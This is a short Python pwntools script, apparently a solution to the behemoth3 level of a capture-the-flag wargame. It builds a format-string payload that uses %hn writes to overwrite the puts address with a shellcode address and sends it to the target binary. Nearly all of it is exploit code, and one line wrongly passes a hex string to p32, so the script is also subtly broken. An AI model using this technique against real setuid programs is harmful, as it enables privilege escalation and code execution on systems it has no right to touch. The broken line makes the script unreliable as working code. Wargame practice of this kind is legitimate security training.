#it won't work in your case you need to redo the steps and chanege the addresses
from pwn import *
puts_address = 0x80497ac
shellcode_address = 0xffffddbe 

#we write decimal 0xffff = 65535 in 0x080497ac+2
#we write decimal 0xddbe = 56766 in 0x080497ac
#payload = "\xac\x97\x04\x08\xae\x97\x04\x08%56758x%2$hn%8769x%3$hn"

p = process("/behemoth/behemoth3")
payload  = ""
payload += p32(puts_address)
payload += p32(hex(puts_address+2))
payload += "%56758x"
payload += "%2$hn"
payload += "%8769x"
payload += "%3$hn"

p.sendline(payload)



